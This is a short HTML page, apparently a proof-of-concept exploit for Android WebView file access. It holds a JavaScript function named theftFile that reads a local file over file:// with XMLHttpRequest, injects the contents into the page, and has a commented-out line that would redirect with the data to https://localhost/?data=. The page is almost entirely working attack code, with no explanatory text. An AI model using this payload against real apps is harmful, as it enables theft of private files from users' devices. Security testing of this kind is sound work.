<html>
<head>
<script type="text/javascript">
    function theftFile(path, callback) {
      var req = new XMLHttpRequest();

      req.open("GET", "file://" + path, true);
      req.onload = function(e) {
        callback(req.responseText);
      }
      req.onerror = function(e) {
        callback(null);
      }
      req.send();
    }

    var file = "/android_asset/ads/house_ad_icon_144x144.webp";

    theftFile(file, function(contents) {
      document.getElementById("add_to_me")
                .innerHTML +=
                `<h3>` +
                contents +
                `</h3>`;
        //location.href = "https://localhost/?data=" + encodeURIComponent(contents);
    });
</script>
</head>
<body>
    <div id="add_to_me">
        <h1>Testing</h1>
    </div>
</body>
</html>
